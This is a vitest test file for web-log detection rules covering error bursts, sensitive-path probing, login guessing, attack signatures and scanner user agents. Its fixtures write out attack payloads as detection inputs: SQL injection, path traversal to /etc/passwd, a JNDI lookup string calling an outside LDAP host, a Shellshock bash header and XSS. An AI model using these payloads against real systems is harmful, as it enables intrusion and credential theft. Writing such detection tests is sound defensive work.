import { describe, expect, it } from 'vitest';
import {
  matchRequestSignatures,
  matchScannerAgent,
  matchSensitivePath,
  safeDecode,
} from '../../../src/features/detection/rules/webSignatures';
import { build, MIN, req, SEC, T0, times } from '../../helpers/events';
import { runOnly } from '../../helpers/detection';

const SCANNER = '203.0.113.9';

describe('WEB-001 4xx burst', () => {
  it('triggers at 50 client errors in 5 minutes, not 49', () => {
    const events = build(times(50, T0, SEC).map((t, i) => req(t, SCANNER, `/p${i}`, 404)));
    const [d] = runOnly('WEB-001', events).detections;
    expect(d).toMatchObject({ matchedEventCount: 50, sourceIps: [SCANNER], severity: 'low' });
    expect(runOnly('WEB-001', events.slice(0, 49)).detections).toHaveLength(0);
  });

  it('ignores 2xx and 5xx responses', () => {
    const events = build(times(60, T0, SEC).map((t, i) => req(t, SCANNER, '/', i % 2 ? 200 : 500)));
    expect(runOnly('WEB-001', events).detections).toHaveLength(0);
  });
});

describe('WEB-002 5xx burst', () => {
  it('triggers across clients and notes concentration', () => {
    const events = build(times(20, T0, SEC).map((t) => req(t, SCANNER, '/api', 500)));
    const [d] = runOnly('WEB-002', events).detections;
    expect(d?.reason).toContain(`100% came from ${SCANNER}`);
    expect(d?.subjects).toEqual({ ips: [], users: [] });
    expect(runOnly('WEB-002', events.slice(0, 19)).detections).toHaveLength(0);
  });
});

describe('WEB-003 sensitive paths', () => {
  const probes = ['/.env', '/.git/config', '/wp-login.php', '/phpmyadmin/', '/backup.sql'];

  it('triggers at five sensitive requests and reports categories', () => {
    const events = build(probes.map((p, i) => req(T0 + i * SEC, SCANNER, p, 404)));
    const [d] = runOnly('WEB-003', events).detections;
    expect(d).toMatchObject({ severity: 'medium', matchedEventCount: 5 });
    expect(runOnly('WEB-003', events.slice(0, 4)).detections).toHaveLength(0);
  });

  it('raises severity when a secret-bearing path was served', () => {
    const events = build(
      probes.map((p, i) => req(T0 + i * SEC, SCANNER, p, p === '/.env' ? 200 : 404)),
    );
    expect(runOnly('WEB-003', events).detections[0]).toMatchObject({
      severity: 'high',
      confidence: 'high',
      title: `Sensitive file served to ${SCANNER}`,
    });
  });

  it('rates admin/login-only access as low', () => {
    const events = build(times(5, T0, SEC).map((t) => req(t, SCANNER, '/admin/', 302)));
    expect(runOnly('WEB-003', events).detections[0]?.severity).toBe('low');
  });

  it('does not match ordinary paths', () => {
    const events = build(
      times(20, T0, SEC).map((t) => req(t, SCANNER, '/administration-guide.html', 200)),
    );
    expect(runOnly('WEB-003', events).detections).toHaveLength(0);
  });
});

describe('WEB-004 path probing', () => {
  it('counts distinct missing paths', () => {
    const distinct = build(times(20, T0, SEC).map((t, i) => req(t, SCANNER, `/dir${i}/`, 404)));
    expect(runOnly('WEB-004', distinct).detections).toHaveLength(1);
    expect(runOnly('WEB-004', distinct.slice(0, 19)).detections).toHaveLength(0);
    const samePath = build(times(50, T0, SEC).map((t) => req(t, SCANNER, '/missing', 404)));
    expect(runOnly('WEB-004', samePath).detections).toHaveLength(0);
  });
});

describe('WEB-005 suspicious methods', () => {
  it('flags unusual methods, rates malformed-only as info, ignores standard methods', () => {
    const trace = build([req(T0, SCANNER, '/', 405, { method: 'TRACE' })]);
    expect(runOnly('WEB-005', trace).detections[0]).toMatchObject({
      severity: 'low',
      confidence: 'high',
    });
    const traceOk = build([req(T0, SCANNER, '/', 200, { method: 'TRACE' })]);
    expect(runOnly('WEB-005', traceOk).detections[0]?.severity).toBe('medium');
    const malformed = build([
      {
        ...req(T0, SCANNER, '/', 400),
        http: { status: 400 },
        issues: ['malformed request line'],
        status: 'partial',
      },
    ]);
    expect(runOnly('WEB-005', malformed).detections[0]?.severity).toBe('info');
    const normal = build(
      ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'].map((m, i) =>
        req(T0 + i, SCANNER, '/', 200, { method: m }),
      ),
    );
    expect(runOnly('WEB-005', normal).detections).toHaveLength(0);
  });

  it('flags non-standard tokens and works without timestamps', () => {
    const odd = build([req(undefined, SCANNER, '/', 400, { method: 'FOOBAR' })]);
    const [d] = runOnly('WEB-005', odd).detections;
    expect(d?.evidence[0]?.value).toContain('non-standard method FOOBAR');
    expect(d?.start).toBeUndefined();
  });
});

describe('WEB-006 excessive volume', () => {
  it('triggers at 300 requests per minute', () => {
    const events = build(times(300, T0, 100).map((t) => req(t, SCANNER, '/', 200)));
    expect(runOnly('WEB-006', events).detections[0]).toMatchObject({
      severity: 'low',
      matchedEventCount: 300,
    });
    expect(runOnly('WEB-006', events.slice(0, 299)).detections).toHaveLength(0);
  });
});

describe('WEB-007 repeated error-producing requests', () => {
  it('recognizes credential guessing against a login endpoint', () => {
    const events = build(
      times(10, T0, 10 * SEC).map((t) => req(t, SCANNER, '/login', 401, { method: 'POST' })),
    );
    const [d] = runOnly('WEB-007', events).detections;
    expect(d).toMatchObject({ severity: 'medium' });
    expect(d?.title).toBe(`Repeated login attempts to /login from ${SCANNER}`);
    expect(runOnly('WEB-007', events.slice(0, 9)).detections).toHaveLength(0);
  });

  it('separates different paths', () => {
    const events = build(times(10, T0, SEC).map((t, i) => req(t, SCANNER, `/x${i % 2}`, 404)));
    expect(runOnly('WEB-007', events).detections).toHaveLength(0);
  });
});

describe('WEB-008 attack signatures', () => {
  it('matches traversal, SQLi and JNDI in user agents', () => {
    const events = build([
      req(T0, SCANNER, '/item?id=1%20UNION%20SELECT%20password%20FROM%20users', 500),
      req(T0 + SEC, SCANNER, '/static/..%2f..%2f..%2fetc/passwd', 404),
      req(T0 + 2 * SEC, SCANNER, '/', 200, { userAgent: '${jndi:ldap://203.0.113.9/a}' }),
    ]);
    const [d] = runOnly('WEB-008', events).detections;
    expect(d).toMatchObject({ severity: 'high', confidence: 'high', matchedEventCount: 3 });
    expect(d?.evidence[0]?.value).toMatch(/SQL injection.*|Path traversal/);
  });

  it('does not match benign queries', () => {
    const events = build([
      req(T0, SCANNER, '/search?q=selection+union+station', 200),
      req(T0, SCANNER, '/docs/version-1.2/index.html', 200),
      req(T0, SCANNER, '/api/orders?sort=date&order=desc', 200),
    ]);
    expect(runOnly('WEB-008', events).detections).toHaveLength(0);
  });

  it('exposes the matching helpers', () => {
    expect(safeDecode('%252e%252e%252f')).toBe('../');
    // Invalid UTF-8 falls back to byte-wise decoding so ASCII escapes are still exposed.
    expect(safeDecode('%2e%2e%2f%E0')).toBe('../\u00e0');
    expect(
      matchRequestSignatures('/a?q=<script>alert(1)</script>', undefined).map(
        (m) => m.signature.id,
      ),
    ).toEqual(['xss']);
    expect(
      matchRequestSignatures('/cgi-bin/test', '() { :; }; /bin/bash -c id').map((m) => m.where),
    ).toEqual(['user-agent']);
    expect(matchSensitivePath('/%2eenv')?.label).toBe('Environment file');
  });
});

describe('WEB-009 scanner user agents', () => {
  it('flags attack tools as low and research scanners as info', () => {
    const tools = build([
      req(T0, SCANNER, '/', 404, { userAgent: 'sqlmap/1.8#stable (https://sqlmap.org)' }),
    ]);
    expect(runOnly('WEB-009', tools).detections[0]).toMatchObject({
      severity: 'low',
      confidence: 'low',
    });
    const research = build([
      req(T0, '198.51.100.7', '/', 200, {
        userAgent: 'Mozilla/5.0 (compatible; CensysInspect/1.1)',
      }),
    ]);
    expect(runOnly('WEB-009', research).detections[0]?.severity).toBe('info');
    const browser = build([
      req(T0, '198.51.100.7', '/', 200, {
        userAgent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0',
      }),
    ]);
    expect(runOnly('WEB-009', browser).detections).toHaveLength(0);
    expect(matchScannerAgent(undefined)).toBeUndefined();
  });
});

describe('web rules on datasets without web events', () => {
  it('report that they are not applicable instead of silently passing', () => {
    const run = runOnly('WEB-001', build([]));
    expect(run.ruleRuns.find((r) => r.ruleId === 'WEB-001')).toMatchObject({
      evaluated: false,
      note: expect.stringContaining('No web requests'),
    });
  });

  it('works across longer windows', () => {
    const events = build(
      times(5, T0, 2 * MIN).map((t, i) =>
        req(t, SCANNER, ['/.env', '/.git/HEAD', '/admin', '/login', '/xmlrpc.php'][i]!, 404),
      ),
    );
    expect(runOnly('WEB-003', events, { windowMinutes: 10 }).detections).toHaveLength(1);
    expect(runOnly('WEB-003', events, { windowMinutes: 5 }).detections).toHaveLength(0);
  });
});
